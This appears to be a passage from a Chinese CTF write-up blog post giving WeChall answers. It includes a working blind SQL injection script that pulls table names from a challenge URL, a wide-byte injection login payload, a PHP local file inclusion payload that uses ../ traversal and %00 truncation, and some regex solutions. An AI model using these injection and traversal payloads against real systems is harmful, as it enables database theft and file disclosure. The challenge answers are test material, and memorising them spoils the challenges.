<p>只有报错，没有回显</p>
<p>尝试语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and if(1&#x3D;1,1,2)&#x3D;1#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>能够登陆</p>
<p>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.wechall.net/challenge/table_names/challenge.php?username=test&#x27;+and+if(&#123;&#125;,1,2)=1%23&amp;password=test&amp;login=login&quot;</span></span><br><span class="line"></span><br><span class="line">success = <span class="string">&quot;Welcome back test&quot;</span></span><br><span class="line">payload1 = <span class="string">&quot;ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">tb_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1, 60):</span></span><br><span class="line"><span class="comment"># 	low = 32</span></span><br><span class="line"><span class="comment"># 	high = 128</span></span><br><span class="line"><span class="comment"># 	while low &lt; high:</span></span><br><span class="line"><span class="comment"># 		mid = (low + high) &gt;&gt; 1</span></span><br><span class="line"><span class="comment"># 		payload = payload1.format(i, mid)</span></span><br><span class="line"><span class="comment"># 		resp = requests.get(url.format(payload))</span></span><br><span class="line"><span class="comment"># 		# print(j)</span></span><br><span class="line"><span class="comment"># 		# print(url.format(payload))</span></span><br><span class="line"><span class="comment"># 		# print( resp.text)</span></span><br><span class="line"><span class="comment"># 		if success in resp.text:</span></span><br><span class="line"><span class="comment"># 			low = mid + 1</span></span><br><span class="line"><span class="comment"># 		else:</span></span><br><span class="line"><span class="comment"># 			high = mid</span></span><br><span class="line"><span class="comment"># 	if low == 32 or high == 128:</span></span><br><span class="line"><span class="comment"># 		break</span></span><br><span class="line"><span class="comment"># 	else:</span></span><br><span class="line"><span class="comment"># 		db_name += chr(low)</span></span><br><span class="line"><span class="comment"># 		print(db_name)</span></span><br><span class="line"></span><br><span class="line">db_name = <span class="string">&quot;gizmore_tableu61&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(db_name)</span><br><span class="line">payload3 = <span class="string">&quot;ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	high = <span class="number">128</span></span><br><span class="line">	<span class="keyword">while</span> low &lt; high:</span><br><span class="line">		mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">		payload = payload3.<span class="built_in">format</span>(payload2, i, mid)</span><br><span class="line">		resp = requests.get(url.<span class="built_in">format</span>(payload))</span><br><span class="line">		<span class="comment"># print(j)</span></span><br><span class="line">		<span class="comment"># print(url.format(payload))</span></span><br><span class="line">		<span class="comment"># print( resp.text)</span></span><br><span class="line">		<span class="keyword">if</span> success <span class="keyword">in</span> resp.text:</span><br><span class="line">			low = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high = mid</span><br><span class="line">	<span class="keyword">if</span> low == <span class="number">32</span> <span class="keyword">or</span> high == <span class="number">128</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		tb_name += <span class="built_in">chr</span>(low)</span><br><span class="line">		print(tb_name)</span><br><span class="line">tb_name=<span class="string">&quot;aaawrong,usertableus4&quot;</span></span><br></pre></td></tr></table></figure>
<p>答案为（试出来的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gizmore_tableu61_usertableus4</span><br></pre></td></tr></table></figure>
<h1 id="Addslashes"><a href="#Addslashes" class="headerlink" title="Addslashes"></a>Addslashes</h1><p>考察：宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username: 1 %Df%27 union select &#39;Admin&#39; from users#</span><br></pre></td></tr></table></figure>


<h1 id="Training-Regex-1"><a href="#Training-Regex-1" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p>考察：正则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^wechall$&#x2F;</span><br></pre></td></tr></table></figure>
<h1 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h1><p>考察：%00截断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># Higlighter Plain 如果有show变量，且show变量的值是source，就显示index.php的代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>] === <span class="string">&#x27;source&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: text/plain; charset=utf8;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Change dir to web root 跳转到这个目录</span></span><br><span class="line">chdir(<span class="string">&#x27;../../../../../&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Print the website header</span></span><br><span class="line">define(<span class="string">&#x27;GWF_PAGE_TITLE&#x27;</span>, <span class="string">&#x27;Local File Inclusion&#x27;</span>);</span><br><span class="line"><span class="comment"># 与require作用相同，唯一区别是若该文件代码已被包含，则不会再次包含</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_head.php&#x27;</span>);</span><br><span class="line"><span class="comment"># ？</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$chall</span> = WC_Challenge::getByTitle(<span class="string">&#x27;Training: PHP LFI&#x27;</span>))) &#123;</span><br><span class="line">        <span class="variable">$chall</span> = WC_Challenge::dummyChallenge(<span class="string">&#x27;Training: PHP LFI&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;challenge/training/php/lfi/up/index.php&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chall</span>-&gt;showHeader();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Highlighter BBCode</span></span><br><span class="line"><span class="comment"># 从URL处判断是否是高亮显示代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;highlight&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;highlight&#x27;</span>] === <span class="string">&#x27;christmas&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_Message::display(<span class="string">&#x27;[PHP]&#x27;</span>.file_get_contents(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]).<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_foot.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment">### Here is your exploit :) ###</span></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment"># 此处为关键语句，code为设置filename=pages/&#123;&#125;.html，如果有file变量，则填入file变量，否则填入welcom</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;$filename = \&#x27;pages/\&#x27;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#x27;.html\&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$code_emulate_pnb</span> = <span class="string">&#x27;$filename = Common::substrUntil($filename, &quot;\\0&quot;);&#x27;</span>; <span class="comment"># Emulate Poison Null Byte for PHP&gt;=5.3.4</span></span><br><span class="line"><span class="comment"># 包含filename文件</span></span><br><span class="line"><span class="variable">$code2</span> = <span class="string">&#x27;include $filename;&#x27;</span>;</span><br><span class="line"><span class="comment">### End of exploit ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show the mission box</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;index.php?file=&#x27;</span>;</span><br><span class="line"><span class="variable">$ex</span> = <span class="keyword">array</span>(<span class="string">&#x27;welcome&#x27;</span>, <span class="string">&#x27;news&#x27;</span>, <span class="string">&#x27;forums&#x27;</span>);</span><br><span class="line"><span class="variable">$showsrc1</span> = <span class="string">&#x27;index.php?show=source&#x27;</span>;</span><br><span class="line"><span class="variable">$showsrc2</span> = <span class="string">&#x27;index.php?highlight=christmas&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ex</span> <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$e</span>) &#123; <span class="variable">$ex</span>[<span class="variable">$i</span>] = htmlspecialchars(<span class="variable">$url</span>.<span class="variable">$e</span>); &#125;</span><br><span class="line"><span class="keyword">echo</span> GWF_Box::box(<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;info&#x27;</span>, <span class="keyword">array</span>(GWF_Message::display(<span class="string">&#x27;[PHP]&#x27;</span>.<span class="variable">$code</span>.PHP_EOL.<span class="variable">$code2</span>.<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;../solution.php&#x27;</span>, <span class="variable">$showsrc1</span>, <span class="variable">$showsrc2</span>, <span class="variable">$ex</span>[<span class="number">0</span>], <span class="variable">$ex</span>[<span class="number">1</span>], <span class="variable">$ex</span>[<span class="number">2</span>])), <span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;title&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Execute the code, using eval.</span></span><br><span class="line">GWF_Debug::setDieOnError(<span class="literal">false</span>);</span><br><span class="line">GWF_Debug::setMailOnError(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>.<span class="variable">$code_emulate_pnb</span>); <span class="comment"># eval the first line</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box_t&quot;&gt;&#x27;</span>.<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;example_title&#x27;</span>).<span class="string">&#x27; (&#x27;</span>.htmlspecialchars(<span class="variable">$filename</span>).<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box_c&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (lfiIsSafeDir(<span class="variable">$filename</span>) === <span class="literal">true</span>) &#123; <span class="keyword">eval</span>(<span class="variable">$code2</span>); &#125; <span class="comment"># Eval the second line, when safe.</span></span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> GWF_HTML::error(<span class="string">&#x27;LFI&#x27;</span>, <span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;err_basedir&#x27;</span>), <span class="literal">false</span>); &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line">GWF_Debug::setMailOnError(<span class="literal">true</span>);</span><br><span class="line">GWF_Debug::setDieOnError(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show credits box</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> !== (<span class="variable">$minus</span> = GWF_User::getByName(<span class="string">&#x27;minus&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_Box::box(<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;credits&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$minus</span>-&gt;displayProfileLink())));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show end of website</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chall</span>-&gt;copyrightFooter();</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_foot.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">### Safety first ###</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lfiIsSafeDir</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$valid</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pages&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/../..&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/..&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> in_array(<span class="variable">$d</span>, <span class="variable">$valid</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据代码中的关键代码段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 此处为关键语句，code为设置filename&#x3D;pages&#x2F;&#123;&#125;.html，如果有file变量，则填入file变量，否则填入welcom</span><br><span class="line">$code &#x3D; &#39;$filename &#x3D; \&#39;pages&#x2F;\&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#39;.html\&#39;;&#39;;</span><br><span class="line">$code_emulate_pnb &#x3D; &#39;$filename &#x3D; Common::substrUntil($filename, &quot;\\0&quot;);&#39;; # Emulate Poison Null Byte for PHP&gt;&#x3D;5.3.4</span><br><span class="line"># 包含filename文件</span><br><span class="line">$code2 &#x3D; &#39;include $filename;&#39;;</span><br></pre></td></tr></table></figure>
<p>提交URL（为什么两个父节点，因为试出来的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;solution.php%00 </span><br><span class="line"># %00用于截断</span><br></pre></td></tr></table></figure>
<h1 id="Training-Regex-2"><a href="#Training-Regex-2" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p>考察：正则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(wechall4?)\.(?:jpg|gif|tiff|bmp|png)$&#x2F;</span><br></pre></td></tr></table></figure>
<p>至于为什么用:，是因为题目提示了“你的模式会补货一个字符串，但这不是必须的。请使用非捕获组”</p>
<h2 id="正则的非获取匹配"><a href="#正则的非获取匹配" class="headerlink" title="正则的非获取匹配"></a>正则的非获取匹配</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?:pattern</span><br><span class="line">	匹配pattern但不获取匹配结果，不进行存储供使用</span><br></pre></td></tr></table></figure>
<p>参考 <a target="_blank" rel="noopener" href="http://qinxuye.me/article/non-capturing-pattern-in-regular-expression/">http://qinxuye.me/article/non-capturing-pattern-in-regular-expression/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(&quot;win (7|vista)&quot;, &quot;win 7&quot;).group()</span><br><span class="line">&#39;win 7&#39;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (7|vista)&quot;, &quot;win 7&quot;).groups()</span><br><span class="line">(&#39;7&#39;,)</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (?:7|vista)&quot;, &quot;win 7&quot;).group()</span><br><span class="line">&#39;win 7&#39;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (?:7|vista)&quot;, &quot;win 7&quot;).groups()</span><br><span class="line">()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" data-id="ckkdrz0z00003ugus79z2hkub" data-title="wechall答案" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 15px;">dev</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/03/04/CTF-wp-Hack101/">CTF-wp-Hack101</a>
          </li>
        
          <li>
            <a href="/2021/03/04/DEV-python-flask/">DEV-python-flask</a>
          </li>
        
          <li>
            <a href="/2021/03/02/DEV-python-tornado/">DEV-python-tornado</a>
          </li>
        
          <li>
            <a href="/2021/03/01/DEV-perl/">dev-perl</a>
          </li>
        
          <li>
            <a href="/2021/02/28/CTF-wp-BUUCTF-Web/">CTF-wp-BUUCTF Web</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>